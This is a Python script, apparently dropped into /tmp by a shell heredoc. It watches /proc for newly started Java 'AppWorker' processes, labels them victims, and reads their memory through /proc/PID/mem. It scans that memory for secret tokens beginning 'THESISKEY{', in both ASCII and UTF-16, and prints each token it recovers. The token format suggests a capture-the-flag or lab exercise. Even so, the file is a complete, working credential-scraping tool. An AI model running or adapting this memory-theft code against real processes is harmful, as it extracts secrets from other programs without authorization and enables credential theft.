#!/usr/bin/env python3
import os, re, time, sys

def is_victim(pid):
    try:
        cmdline = open(f"/proc/{pid}/cmdline", "rb").read()
        return b'java' in cmdline and b'AppWorker' in cmdline
    except:
        return False

def extract_token(pid):
    found = []
    try:
        maps = open(f"/proc/{pid}/maps").readlines()
        mem = open(f"/proc/{pid}/mem", "rb", 0)
        pat_ascii = b'THESISKEY{'
        pat_utf16 = pat_ascii.decode().encode('utf-16-le')

        for line in maps:
            m = re.match(r'([0-9a-f]+)-([0-9a-f]+)\s+(\S+)', line.strip())
            if not m: continue
            start, end, perms = int(m.group(1),16), int(m.group(2),16), m.group(3)
            if 'r' not in perms: continue
            size = end - start
            if size > 300*1024*1024 or size == 0: continue
            try:
                mem.seek(start)
                chunk = mem.read(size)
                idx = chunk.find(pat_ascii)
                while idx >= 0:
                    eb = chunk.find(b'}', idx)
                    if 0 < eb-idx < 200:
                        cand = chunk[idx:eb+1]
                        if all(32 <= b < 127 for b in cand):
                            found.append(cand.decode())
                    idx = chunk.find(pat_ascii, idx+1)
                idx = chunk.find(pat_utf16)
                while idx >= 0:
                    cl = chunk.find(b'\x7d\x00', idx)
                    if 0 < cl-idx < 400:
                        tok = chunk[idx:cl+2].decode('utf-16-le','replace')
                        if '{' in tok: found.append(tok)
                    idx = chunk.find(pat_utf16, idx+2)
            except: pass
        mem.close()
    except Exception as e:
        print(f"err: {e}", flush=True)
    return found

print("[*] Watcher started", flush=True)
seen = set()
for i in range(2400):
    try:
        cur = set(int(p) for p in os.listdir('/proc') if p.isdigit())
        for pid in cur - seen:
            if is_victim(pid):
                print(f"[+] VICTIM PID={pid}", flush=True)
                time.sleep(2)
                tokens = extract_token(pid)
                for t in tokens:
                    print(f"[!] TOKEN: {t}", flush=True)
        seen = cur
    except: pass
    time.sleep(0.1)
print("[-] Done", flush=True)
PYEOF
echo "Script written: $(wc -l /tmp/watch_v2.py)"

